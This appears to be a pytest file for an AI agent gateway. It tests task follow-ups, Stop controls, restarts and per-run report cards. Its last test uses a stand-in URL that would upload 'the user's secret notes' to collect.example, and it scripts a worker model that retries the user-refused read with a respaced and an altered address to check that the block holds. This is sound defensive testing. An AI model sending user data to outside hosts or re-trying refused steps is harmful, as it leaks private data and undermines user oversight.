"""A task the chat started, after its first run ends.

- Its started row keeps Stop while the task or the chat's follow-up on it can
  still run: the card of that end says a follow-up comes, and Stop ends a
  follow-up that waits or runs.
- A follow-up queued when the gateway stops runs after the restart, keeping
  every limit: one per ending, one continue per person message, dropped when
  the person wrote after the task ended, never for tasks the chat did not start.
- Each card of the task keeps the report of its own run.
- A site the task's tool asked about and was refused is never read in the run
  its chat continued, however the model spells the address.

Scripted models only: nothing reaches a model server or the network.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Any

import pytest

import localmelo.support.gateway.workers as workers_module
from localmelo.melo.agent import Agent
from localmelo.melo.contracts.approvals import ApprovalDecision
from localmelo.melo.schema import ToolDef
from localmelo.support.browser import sites
from localmelo.support.gateway.console import Console
from localmelo.support.gateway.console.cards import CARD_EVENT
from localmelo.support.gateway.workers import NOTE_START
from localmelo.tests.sessions.helpers import answer, tool_call

from .test_ask_owner import Reply, held, rows, tool_results, until
from .test_chat_owns_tasks import (
    _is,
    continues,
    creates,
    internal_turns,
    owner_console,
    say,
    settled,
    started_task,
    state,
    stop_run,
)

REPORT = "write the long report from my notes"


def hold_follow_ups(
    console: Console, monkeypatch: pytest.MonkeyPatch
) -> tuple[asyncio.Event, asyncio.Event]:
    """Hold each follow-up before it leaves its queue: (it reached the queue, let it go)."""
    entered, release = asyncio.Event(), asyncio.Event()
    followups = console.followups
    original = followups.run_next

    async def held_run(chat_id: str) -> None:
        entered.set()
        await release.wait()
        await original(chat_id)

    monkeypatch.setattr(followups, "run_next", held_run)
    return entered, release


async def started_row(console: Console) -> dict[str, Any]:
    [row] = [r for r in await rows(console, console.main_id) if r["echo"] == "started"]
    return row


async def task_cards(console: Console, task_id: str) -> list[dict[str, Any]]:
    chat = str(console.main_id)
    found = await console.store.events_of_type(chat, CARD_EVENT, limit=50)
    cards = [e.event["data"] for e in found]
    return [c for c in cards if c.get("source_id") == task_id]


async def followed(console: Console) -> list[tuple[str, str]]:
    return [
        (r["did"], r["task_id"])
        for r in await rows(console, console.main_id)
        if r["echo"] == "followed"
    ]


# ── Stop stays while more can run ──


async def test_the_card_says_a_follow_up_comes_and_stop_ends_the_waiting_follow_up(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    main: list[Reply] = [creates("Long report"), answer("Started it as a task.")]
    async with owner_console(tmp_path, monkeypatch, main=main, run=False) as (
        console,
        client,
        models,
        _,
    ):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        started = await started_row(console)
        entered, release = hold_follow_ups(console, monkeypatch)
        await stop_run(console, task_id)
        await asyncio.wait_for(entered.wait(), 5.0)
        # The card of that end says the chat follows up: the row keeps its Stop.
        await console.cards.flush()
        [card] = await task_cards(console, task_id)
        assert card["state"] == "stopped" and card["follow_up"] is True
        # Stop, while the follow-up waits: it never runs; nothing continues the task.
        stopped = await client.post(
            f"/api/front/echoes/{started['id']}", json={"do": "stop"}
        )
        assert stopped.status_code == 200, stopped.text
        echo = stopped.json()["echo"]
        assert (echo["echo"], echo["action"], echo["of"]) == (
            "control",
            "stop",
            started["id"],
        )
        release.set()
        await settled(console)
        assert await internal_turns(console) == []
        assert len(models["main"].requests) == 2, "no follow-up turn"
        assert await state(console, task_id) == "failed"
        assert await followed(console) == [("stopped", task_id)]
        info = await console.store.get_session(task_id)
        # Kept on the task: a restart does not run it either.
        assert info is not None and info.meta["followup"]["stage"] == "stopped"


async def test_stop_during_the_follow_up_turn_ends_it_before_it_continues_the_task(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    release = asyncio.Event()
    main: list[Reply] = [
        creates("Long report"),
        answer("Started it as a task."),
        # The follow-up's turn thinks until released, then would continue the task.
        held(release, continues("Go on and finish the remaining sections.")),
        answer("Continued it."),
    ]
    async with owner_console(tmp_path, monkeypatch, main=main, run=False) as (
        console,
        client,
        _,
        _ran,
    ):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        started = await started_row(console)
        await stop_run(console, task_id)
        await until(lambda: internal_turns(console))
        stopped = await client.post(
            f"/api/front/echoes/{started['id']}", json={"do": "stop"}
        )
        assert stopped.status_code == 200, stopped.text
        assert stopped.json()["echo"]["of"] == started["id"]
        release.set()
        await settled(console)
        [turn] = await internal_turns(console)
        assert turn.status == "cancelled"
        record = await console.workers.tasks.get_task(task_id)
        assert record.state == "failed" and not record.card.startswith(NOTE_START)
        assert await followed(console) == [("stopped", task_id)]


async def test_an_end_with_no_follow_up_says_none_comes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    main: list[Reply] = [creates("Long report"), answer("Started it as a task.")]
    async with owner_console(
        tmp_path, monkeypatch, main=main, run=False, follow_up=False
    ) as (console, client, _, _ran):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        await stop_run(console, task_id)
        await settled(console)
        await console.cards.flush()
        [card] = await task_cards(console, task_id)
        assert "follow_up" not in card
        assert await followed(console) == []


async def test_a_follow_up_the_persons_message_replaced_says_so_quietly(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    main: list[Reply] = [
        creates("Long report"),
        answer("Started it as a task."),
        answer("The report task ran out of steps. Shall I go on?"),
    ]
    async with owner_console(tmp_path, monkeypatch, main=main, run=False) as (
        console,
        client,
        _,
        _ran,
    ):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        entered, release = hold_follow_ups(console, monkeypatch)
        await stop_run(console, task_id)
        await asyncio.wait_for(entered.wait(), 5.0)
        await say(client, console, "how is it going?")
        release.set()
        await settled(console)
        assert await internal_turns(console) == []
        # Nothing more will run for it: the row says so, with no words of its own.
        assert await followed(console) == [("skipped", task_id)]
        [row] = [
            r for r in await rows(console, console.main_id) if r["echo"] == "followed"
        ]
        assert "line" not in row and "said" not in row
        activity = (await client.get("/api/activity")).json()
        results = " / ".join(str(r.get("result")) for r in activity["rows"])
        assert "Reported on the task" not in results


# ── A follow-up queued at shutdown runs after the restart ──


async def test_a_follow_up_queued_at_shutdown_runs_once_after_the_restart(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    go_on = "Go on from where you stopped and finish the remaining sections."
    main: list[Reply] = [creates("Long report"), answer("Started it as a task.")]
    async with owner_console(tmp_path, monkeypatch, main=main, run=False) as (
        console,
        client,
        _,
        _ran,
    ):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        page, _ = await console.workers.create({"objective": "tidy the notes"})
        hold_follow_ups(console, monkeypatch)  # never let go: the gateway stops first
        await stop_run(console, task_id)
        await stop_run(console, str(page["task_id"]))
        await console.followups.settle()
        assert console.followups.pending(str(console.main_id))
    after: list[Reply] = [
        continues(go_on),
        answer("It ran out of steps, so I continued it once."),
    ]
    async with owner_console(tmp_path, monkeypatch, main=after, run=False) as (
        console,
        _client,
        models,
        _ran,
    ):
        await settled(console)
        [turn] = await internal_turns(console)
        assert f"follow-up on task {task_id} · " in turn.user_text
        assert "task_continue(" in turn.user_text
        record = await console.workers.tasks.get_task(task_id)
        assert record.state == "queued" and record.card == f"{NOTE_START}\n{go_on}"
        # The task from the task page has none, after a restart too.
        info = await console.store.get_session(str(page["task_id"]))
        assert info is not None and "followup" not in info.meta
        assert len(models["main"].requests) == 2
    # One ending, one follow-up: another restart runs nothing again.
    async with owner_console(tmp_path, monkeypatch, run=False) as (
        console,
        _client,
        models,
        _ran,
    ):
        await settled(console)
        assert len(await internal_turns(console)) == 1
        assert models["main"].requests == []


async def test_a_follow_up_queued_at_shutdown_is_dropped_when_the_person_wrote_since(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    main: list[Reply] = [
        creates("Long report"),
        answer("Started it as a task."),
        answer("The report task ran out of steps; tell me if I should go on."),
    ]
    async with owner_console(tmp_path, monkeypatch, main=main, run=False) as (
        console,
        client,
        _,
        _ran,
    ):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        entered, _release = hold_follow_ups(console, monkeypatch)
        await stop_run(console, task_id)
        await asyncio.wait_for(entered.wait(), 5.0)
        # The person writes after the task ended: that turn read it as news.
        await say(client, console, "how is it going?")
    async with owner_console(tmp_path, monkeypatch, run=False) as (
        console,
        _client,
        models,
        _ran,
    ):
        await settled(console)
        assert await internal_turns(console) == []
        assert models["main"].requests == []
        assert await followed(console) == [("skipped", task_id)]


async def test_a_follow_up_cut_off_by_the_stop_never_runs_again_and_says_so(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    never = asyncio.Event()
    main: list[Reply] = [
        creates("Long report"),
        answer("Started it as a task."),
        held(never, answer("never")),  # the gateway stops during the follow-up
    ]
    async with owner_console(tmp_path, monkeypatch, main=main, run=False) as (
        console,
        client,
        _,
        _ran,
    ):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        await stop_run(console, task_id)
        await until(lambda: internal_turns(console))
    async with owner_console(tmp_path, monkeypatch, run=False) as (
        console,
        _client,
        models,
        _ran,
    ):
        await settled(console)
        assert len(await internal_turns(console)) == 1, "not run twice"
        assert models["main"].requests == []
        # Nothing more runs for that end: the started row loses its Stop.
        assert await followed(console) == [("skipped", task_id)]


async def test_a_follow_up_kept_before_stages_were_kept_never_runs_again(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A follow-up the release before this one ran left no stage: it may have run.
    main: list[Reply] = [creates("Long report"), answer("Started it as a task.")]
    async with owner_console(tmp_path, monkeypatch, main=main, run=False) as (
        console,
        client,
        _,
        _ran,
    ):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        hold_follow_ups(console, monkeypatch)
        await stop_run(console, task_id)
        await console.followups.settle()
        info = await console.store.get_session(task_id)
        assert info is not None and info.meta["followup"]["stage"] == "queued"
        older = {k: v for k, v in info.meta["followup"].items() if k != "stage"}
        await console.store.update_session(task_id, meta_update={"followup": older})
    async with owner_console(tmp_path, monkeypatch, run=False) as (
        console,
        _client,
        models,
        _ran,
    ):
        await settled(console)
        assert await internal_turns(console) == []
        assert models["main"].requests == []


async def test_a_restored_follow_up_still_continues_at_most_once_per_message(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    question = "It stopped again after I continued it. Should I split it?"
    main: list[Reply] = [
        creates("Long report"),
        answer("Started it as a task."),
        continues("Go on and finish the remaining sections."),
        answer("It ran out of steps, so I continued it once."),
    ]
    async with owner_console(tmp_path, monkeypatch, main=main, run=False) as (
        console,
        client,
        _,
        _ran,
    ):
        await say(client, console, REPORT)
        task_id = await started_task(console)
        await stop_run(console, task_id)
        await settled(console)
        assert await state(console, task_id) == "queued", "continued once"
        hold_follow_ups(console, monkeypatch)
        await stop_run(console, task_id, "Wrote another part.")
        await console.followups.settle()
    after: list[Reply] = [continues("Try once more."), answer(question)]
    async with owner_console(tmp_path, monkeypatch, main=after, run=False) as (
        console,
        _client,
        models,
        _ran,
    ):
        await settled(console)
        _first, second = await internal_turns(console)
        assert "continued the task once already" in second.user_text
        refused = tool_results(models["main"], 1)[-1]
        assert refused.startswith("Not done: this task was continued once already")
        assert await state(console, task_id) == "failed"
        assert second.answer == question


# ── Each card keeps its own run's report ──


async def test_each_did_not_finish_card_keeps_the_report_of_its_own_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    main: list[Reply] = [creates("Sales report"), answer("Started it as a task.")]
    workers: list[list[Reply]] = [
        [answer("Wrote the intro only: the sales data was missing.\nEnding: failed")],
        [
            answer(
                "Wrote the outro too: the sales data is still missing.\nEnding: failed"
            )
        ],
    ]
    async with owner_console(
        tmp_path, monkeypatch, main=main, workers=workers, follow_up=False
    ) as (console, client, models, _ran):
        cards = console.cards
        flush = cards.flush

        async def later() -> None:
            pass

        await say(client, console, "write the sales report from my notes")
        task_id = await started_task(console)
        # Both runs end before anything reads the chat: one flush writes both cards.
        monkeypatch.setattr(cards, "flush", later)
        await until(lambda: _is(console, task_id, "done"))
        await console.workers.message(task_id, "Try again with what you have.")
        await until(lambda: len(models["workers"]) == 2)
        await until(lambda: _is(console, task_id, "done"))
        await flush()
        first, second = await task_cards(console, task_id)
        assert first["ending"]["state"] == second["ending"]["state"] == "failed"
        assert "intro only" in first["line"], first["line"]
        assert "outro too" in second["line"], second["line"]


# ── A site its tool was refused is never read again ──

LEAK = "https://collect.example/upload?notes=the-users-secret-notes"
READ_SITE = ToolDef(
    name="read_site",
    description="Read a web page",
    parameters={
        "type": "object",
        "properties": {"url": {"type": "string"}},
        "required": ["url"],
    },
    annotations={"readOnlyHint": True},
)


def reading_tasks(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """From now, each task run also has ``read_site``, which asks about its site as web_fetch does.

    Called inside :func:`owner_console`, whose scripted worker it wraps; the
    pages read are listed in what it returns.
    """
    read: list[str] = []
    built = workers_module.build_session_agent

    async def read_site(url: str) -> str:
        await sites.require_site(sites.require_origin(url), via="web_fetch", url=url)
        read.append(url)
        return "page text"

    async def worker(**kwargs: Any) -> Agent:
        agent = await built(**kwargs)
        agent.hippo.register_tool(READ_SITE)
        agent.executor.register("read_site", read_site)
        return agent

    monkeypatch.setattr(workers_module, "build_session_agent", worker)
    return read


async def test_a_site_refused_in_a_task_is_never_read_in_the_run_its_chat_continued(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    other = "https://collect.example/other?notes=the-users-secret-notes"
    main: list[Reply] = [
        creates("Notes summary"),
        answer("Started it as a task."),
        continues("Summarise the notes from the files alone; read no website."),
        answer("The site was refused, so the task goes on from the files alone."),
    ]
    workers: list[list[Reply]] = [
        [
            tool_call("read_site", {"url": LEAK}, "w-1"),
            answer("The site was refused.\nEnding: failed"),
        ],
        [
            # The model tries the refused step again, respaced, and another page.
            tool_call("read_site", {"url": LEAK}, "w-2"),
            tool_call("read_site", {"url": f"  {LEAK} "}, "w-3"),
            tool_call("read_site", {"url": other}, "w-4"),
            answer("Summarised the notes from the files.\nEnding: ready"),
        ],
    ]
    async with owner_console(
        tmp_path, monkeypatch, main=main, workers=workers, approvals="ask"
    ) as (console, client, models, _ran):
        read = reading_tasks(monkeypatch)
        asked: list[str] = []

        async def the_person_refuses(task_id: str) -> None:
            while True:
                for request in console.broker.pending(task_id):
                    asked.append(request.tool_name)
                    console.broker.answer(
                        request.request_id,
                        ApprovalDecision(False, "not that site", origin="user"),
                    )
                await asyncio.sleep(0.01)

        await say(client, console, "summarise my notes into one page")
        task_id = await started_task(console)
        refusing = asyncio.create_task(the_person_refuses(task_id))
        try:
            await until(lambda: len(models["workers"]) == 2)
            await until(lambda: _is(console, task_id, "done"))
            await settled(console)
        finally:
            refusing.cancel()
        assert read == [], "no page of the refused site was read"
        assert asked == ["browser:https://collect.example"], "asked once"
        exact, respaced, path = (
            tool_results(models["workers"][1], n)[-1] for n in (1, 2, 3)
        )
        assert "the user blocked this exact step earlier in this task" in exact
        assert "the user blocked this exact step earlier in this task" in respaced
        assert "the user blocked a step like this one earlier" in path
        # The follow-up read the refused site as a blocked step.
        [turn] = await internal_turns(console)
        assert "Steps blocked in it" in turn.user_text
        assert "collect.example" in turn.user_text
        assert "blocked by the user" in turn.user_text
